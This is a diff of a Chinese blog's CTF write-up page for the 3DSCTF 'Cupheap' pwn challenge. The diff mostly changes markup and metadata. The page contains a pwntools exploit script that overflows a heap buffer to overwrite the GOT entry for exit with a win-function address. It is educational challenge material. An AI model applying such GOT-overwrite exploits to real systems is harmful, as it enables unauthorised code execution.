@@ -66,7 +66,7 @@
 
 
 
-  <meta name="keywords" content="pwn,ctf,">
+  <meta name="keywords" content="ctf,pwn,">
 
 
 
@@ -79,23 +79,23 @@
 
 
 
-<meta name="description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) 程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x10">
-<meta name="keywords" content="pwn,ctf">
+<meta name="description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x1">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="3DSCTF PWN —— Cupheap">
 <meta property="og:url" content="https://www.giantbranch.cn/2017/12/21/3DSCTF PWN —— Cupheap/index.html">
 <meta property="og:site_name" content="giantbranch&#39;s blog">
-<meta property="og:description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) 程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x10">
+<meta property="og:description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x1">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1514043773800.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1514043814313.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1514043874630.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1514044020294.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1514045612098.jpg">
-<meta property="og:updated_time" content="2019-05-24T15:07:13.268Z">
+<meta property="og:updated_time" content="2019-06-17T12:14:45.670Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="3DSCTF PWN —— Cupheap">
-<meta name="twitter:description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) 程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x10">
+<meta name="twitter:description" content="先看保护，只开了NX 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  程序一开始malloc了四次  在内存中的结构如下  我们看到这里有个溢出  因为上面申请了8个byte，这里可以输入0x1">
 <meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1514043773800.jpg">
 
 
@@ -386,7 +386,8 @@
 
       
         <p>先看保护，只开了NX</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></div><div class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></div><div class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></div><div class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></div><div class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></div></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
+
 <p>程序一开始malloc了四次</p>
 <p><img src="http://pic.giantbranch.cn/pic/1514043773800.jpg" alt></p>
 <p>在内存中的结构如下</p>
@@ -400,7 +401,8 @@
 <p>我这里本地新建了个hell文件做测试，内容是flag{test}</p>
 <p><img src="http://pic.giantbranch.cn/pic/1514045612098.jpg" alt></p>
 <p>代码如下：</p>
-<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">from pwn <span class="built_in">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = "debug"</span></div><div class="line"></div><div class="line"><span class="attr">elf</span> = ELF(<span class="string">"./cupheap"</span>)</div><div class="line"></div><div class="line"><span class="attr">visitHell</span> = <span class="number">0</span>x4008F7</div><div class="line"></div><div class="line">while <span class="number">1</span>:</div><div class="line">	<span class="attr">p</span> = process(<span class="string">"./cupheap"</span>)</div><div class="line">	p.recvuntil(<span class="string">"Give up\n"</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	<span class="attr">recv</span> = p.recvuntil(<span class="string">"Choose one option"</span>)</div><div class="line">	<span class="keyword">if</span> <span class="string">"0x1100"</span> <span class="keyword">in</span> recv:</div><div class="line">		<span class="comment"># not 1,2,3 is ok</span></div><div class="line">		p.sendline(<span class="string">"6"</span>)</div><div class="line">		p.recvuntil(<span class="string">"Visit Mausoleum\n"</span>)</div><div class="line">		p.sendline(<span class="string">"4"</span>)</div><div class="line">		p.recvuntil(<span class="string">"what is the name their superpowers?\n"</span>)</div><div class="line">		<span class="attr">payload</span> = <span class="string">"a"</span> * <span class="number">40</span> </div><div class="line">		payload += p64(elf.got[<span class="string">"exit"</span>])</div><div class="line">		p.sendline(payload)</div><div class="line">		sleep(<span class="number">2</span>)</div><div class="line">		p.sendline(p64(visitHell))</div><div class="line">		p.interactive()</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		p.close()</div></pre></td></tr></table></figure>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"./cupheap"</span>)</span><br><span class="line"></span><br><span class="line"><span class="attr">visitHell</span> = <span class="number">0</span>x4008F7</span><br><span class="line"></span><br><span class="line">while <span class="number">1</span>:</span><br><span class="line">	<span class="attr">p</span> = process(<span class="string">"./cupheap"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Give up\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	<span class="attr">recv</span> = p.recvuntil(<span class="string">"Choose one option"</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"0x1100"</span> <span class="keyword">in</span> recv:</span><br><span class="line">		<span class="comment"># not 1,2,3 is ok</span></span><br><span class="line">		p.sendline(<span class="string">"6"</span>)</span><br><span class="line">		p.recvuntil(<span class="string">"Visit Mausoleum\n"</span>)</span><br><span class="line">		p.sendline(<span class="string">"4"</span>)</span><br><span class="line">		p.recvuntil(<span class="string">"what is the name their superpowers?\n"</span>)</span><br><span class="line">		<span class="attr">payload</span> = <span class="string">"a"</span> * <span class="number">40</span> </span><br><span class="line">		payload += p64(elf.got[<span class="string">"exit"</span>])</span><br><span class="line">		p.sendline(payload)</span><br><span class="line">		sleep(<span class="number">2</span>)</span><br><span class="line">		p.sendline(p64(visitHell))</span><br><span class="line">		p.interactive()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -473,9 +475,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
             <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
